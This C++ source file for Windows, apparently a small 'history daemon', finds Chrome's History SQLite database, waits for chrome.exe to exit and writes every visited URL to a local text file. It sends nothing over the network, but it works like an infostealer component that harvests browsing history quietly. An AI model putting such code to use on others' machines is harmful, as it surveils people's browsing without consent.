#include <Windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <cstdio>
#include <cstdlib>
#include <chrono>
#include <iostream>
#include <filesystem>

#include "sqlite/sqlite3.h"
#include "write.h"

//This daemon is short. After getting the history one time, it will exit
//TODO keep looking for history after first run

//This function is simple. It writes the history from the information that sqlite gives
int process_history(void *NotUsed, int argc, char **argv, char **azColName){
    for (short i = 0; i < argc; i++){
        write_endl(argv[i], "history.txt");
    }
    
    return 0;
}

void get_history(const char* histpath){
    //Init variables for sqlite
    sqlite3 *histdb;
    char *err = 0;
    int rc;
    std::string sql;

    //I don't remember this specifics of this part
    rc = sqlite3_open(histpath, &histdb);

    if (rc){
        write_endl(sqlite3_errmsg(histdb), "history.txt");
        sqlite3_close(histdb);
    }
    //SELECT url FROM urls -> get each url from the databased urls
    sql = "SELECT url FROM urls;";

    //Execute the sql command. Pass the urls to process_history
    sqlite3_exec(histdb, sql.c_str(), process_history, 0, &err);
}

bool check_chrome_running(){

    //init variables
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;
    DWORD dwPriorityClass;

    //Create snapshot
    //if errors are present, assume chrome is running and don't continue
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE){
        //This probably isn't a good idea
        write_endl("Unable to detirmine if chrome is running. Waiting until next time to check.", "history.txt");
        return true;
    }
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if ( !Process32First(hProcessSnap, &pe32)){
        write_endl("Process32First error.", "history.txt");
        CloseHandle(hProcessSnap);
        return true;
    }

    //run through processes, check if any are chrome.exe
    do {
        char filename[256];

        
        if (strcmp(pe32.szExeFile, "chrome.exe") == 0){ 
            //If chrome.exe is running, return true
            return true;
        }
    }while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    //if not, return false
    return false;
}

void init_historyd(){
    //Initialize historyd

    //Check for Chrome installation

    //make path that history file should be in
    const char* appdatalocal_charptr = std::getenv("LOCALAPPDATA");
    std::string str_path = std::string(appdatalocal_charptr);
    str_path.append("\\Google\\Chrome\\User Data\\Default\\History");

    //convert from std::string to std::filesystem::path
    std::filesystem::path historyfile{ str_path };
    
    write_endl(std::string("Checking for chrome installation"), "history.txt");

    if (std::filesystem::exists(historyfile)) {
        //if exists

        write_endl("Installation Exists", "history.txt");

        //wait until chrome stops running
        //TODO remove message, wait for a period of time after
        while(check_chrome_running()){
            write_endl("Chrome Process Running, will not continue", "history.txt");
        }
        
        //The main stuff goodness is here
        get_history(str_path.c_str());
    } 
    else {
        write_endl("No installation, killing daemon.", "history.txt");
        return;
    }


}
